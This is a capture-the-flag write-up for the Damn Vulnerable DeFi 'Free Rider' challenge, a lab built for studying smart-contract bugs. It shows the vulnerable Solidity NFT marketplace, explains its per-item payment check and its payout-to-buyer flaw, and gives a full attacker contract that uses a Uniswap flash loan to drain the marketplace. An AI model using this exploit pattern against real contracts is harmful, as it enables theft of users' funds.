# Free Rider

## Challenge

### Challenge Description

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

### First Analysis

This challenge consists of 3 contracts. 

The first and main contract that we want to exploit is the marketplace. On it users can offer their NFTs for sale and other users can buy NFTs (even multiple NFTs at once).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount; ) {
            _token.safeMint(msg.sender);
            unchecked { ++i; }
        }
        token = _token;
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0)
            revert InvalidTokensAmount();
            
        if (amount != prices.length)
            revert InvalidPricesAmount();

        for (uint256 i = 0; i < amount;) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
                ++i;
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0)
            revert InvalidPrice();

        if (msg.sender != _token.ownerOf(tokenId))
            revert CallerNotOwner(tokenId);

        if (_token.getApproved(tokenId) != address(this) && !_token.isApprovedForAll(msg.sender, address(this)))
            revert InvalidApproval();

        offers[tokenId] = price;

        assembly { // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length;) {
            unchecked {
                _buyOne(tokenIds[i]);
                ++i;
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0)
            revert TokenNotOffered(tokenId);

        if (msg.value < priceToPay)
            revert InsufficientPayment();

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}
```

Then there is the contract that the devs use to recover the NFTs. It sends the recipient 45 ETH if he returns all the NFTs.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

/**
 * @title FreeRiderRecovery
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;

    uint256 private constant PRIZE = 45 ether;
    address private immutable beneficiary;
    IERC721 private immutable nft;
    uint256 private received;

    error NotEnoughFunding();
    error CallerNotNFT();
    error OriginNotBeneficiary();
    error InvalidTokenID(uint256 tokenId);
    error StillNotOwningToken(uint256 tokenId);

    constructor(address _beneficiary, address _nft) payable {
        if (msg.value != PRIZE)
            revert NotEnoughFunding();
        beneficiary = _beneficiary;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        console.log("onERC721Received called");

        if (msg.sender != address(nft))
        {
            console.log("onERC721Received Caller is not NFT");
            revert CallerNotNFT();  
        }
        if (tx.origin != beneficiary)
        {
            console.log("onERC721Received Origin is not beneficiary");
            revert OriginNotBeneficiary();
        }

        if (_tokenId > 5)
        {
            console.log("onERC721Received Invalid token ID");
            revert InvalidTokenID(_tokenId);
        }

        if (nft.ownerOf(_tokenId) != address(this))
        {
            console.log("onERC721Received Still not owning token");
            revert StillNotOwningToken(_tokenId);
        }

        if (++received == 6) 
        {
            console.log("All NFTs received");
            console.logBytes(_data);
            address recipient = abi.decode(_data, (address));
            console.log("Prize will be sent");
            payable(recipient).sendValue(PRIZE);
        }

        console.log("onERC721Received Selector returned");

        return IERC721Receiver.onERC721Received.selector;
    }
}
```

There is also a UniswapV2 factory, as well as the DVT(Damn Valuable Token), deployed.


## Solution

The solution consists of multiple steps.

### 1. Free NFTs

The first vulnerability leads to the case that we can buy arbitrary amounts of NFTs listed on the market, as long as we send the value of the most expensive NFT we can get all the others in the bulk transaction for free. This is due to this if-check in the _buyOne() function:

```solidity
    if (msg.value < priceToPay)
```

As this check is done for every call to the function, it just checks if you send more wei than for the most expensive NFT. This could easily be prevented by saving the msg.value into a value at the start of the buyMany(), decreasing it with every NFT, and requiring that it is over 0 (or abusing the underflow protection for that).


### 2. Free Money

The next issue is that the money made from selling an NFT is not sent to the original owner but to the person that bought it. This is due to an issue in the snippet below.

```solidity
// transfer from seller to buyer
DamnValuableNFT _token = token; // cache for gas savings
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller using cached token
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

The issue here is that by using safeTransferFrom() the ownership is transferred to the new owner. So when the contract calls to ownerOf() to see who to send the money to, it gets the address of the new owner. As a result of this, the proceeds are sent to the buyer instead of the seller.


### 3. Draining

When we combine both of these issues we get a way to drain the contract of lots of ETH and (possibly all) NFTs. We can abuse the first issue to buy way more NFTs than we can afford, for example, 10 NFTs with a price of 15 ETH each by just sending 15 ETH to the contract. The contract then, because of the issue mentioned in 2., sends 10x15ETH to us. So we can make a profit of 135ETH.


### 4. Flash Loan

To exploit this vulnerability we still need money to be able to even buy one NFT. Their price is 15 ETH each, but we only have 0.1 ETH. We luckily can use UniswapV2's function to issue a flashloan to ourselves. If we add data() to the swap() function it calls our uniswapV2Call() function after giving us the first token. So we can now do whatever we want, we just have to give it back 1.003x the amount it gave us at the end. 

### The attack plan

So what we want to do is use the flash loan to exploit the vulnerabilities in the marketplace and get the money. So our plan looks like this:

1. Call swap() for 15WETH
2. Receive the Callback from UniswapV2
3. Withdraw the 15WETH we got, to get 15 ETH
4. Exploit the vulnerability in the marketplace to get all NFTs and 75ETH
5. Repay the loan
6. Return the NFTs
7. Pay out all the money to the player

### The Attack contract

I then implemented all of this into an attack contract that does all the work for us:

```solidity
contract FreeRiderAttacker is IERC721Receiver{
    IERC721 nft;
    IERC20 dvt;
    IWETH weth;
    IMarketplace marketplace;
    address recovery;
    IUniswapV2Factory factory;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    uint256 NFT_PRICE = 15 ether;
    bool attack_succesfull = false;

    constructor(address _token, address _weth, address _nft, address _marketplace, address _pair, address _router, address _factory, address _recovery) public
    {
        dvt = IERC20(_token);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        marketplace = IMarketplace(_marketplace);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        factory = IUniswapV2Factory(_factory);
        recovery = _recovery;
    }

    function attack() external
    {
        //get a flash loan from uniswap
        pair.swap(NFT_PRICE, 0, address(this), "test42069");
        require(attack_succesfull, "Attack failed");
        msg.sender.call{value: address(this).balance}("");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external
    {
        //change all the WETH to ETH    
        weth.withdraw(NFT_PRICE);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        //Buy all the NFTs for 15 eth
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        //Give the NFTs to the developer
        for (uint256 id = 0; id < 6; id++)
        {
            nft.safeTransferFrom(address(this), recovery, id, abi.encode(address(this)));
        }

        require(nft.balanceOf(address(this)) == 0, "Not all NFTs were transferred");
        require(address(this).balance > 45 ether, "Prize was not received");

        address[] memory path = new address[](1);
        path[0] = address(dvt);

        //15 ether / 0.997 = 15.045135406218655968 ether 
        weth.deposit{value: 15.045135406218655968 ether}();
        weth.transfer(address(pair), 15.045135406218655968 ether);

        attack_succesfull = true;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4)
    {
        //return the selector
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() external payable
    {

    }

    fallback() external payable
    {

    }
}
```

### The Testcase

Finally, I implemented this in the testcase, which was super easy as I only had to deploy my attack contract and run it.

```js
let Attacker = await (await ethers.getContractFactory('FreeRiderAttacker', player)).deploy(token.address, weth.address, nft.address, marketplace.address, uniswapPair.address, uniswapRouter.address, uniswapFactory.address, devsContract.address);
await Attacker.attack();
```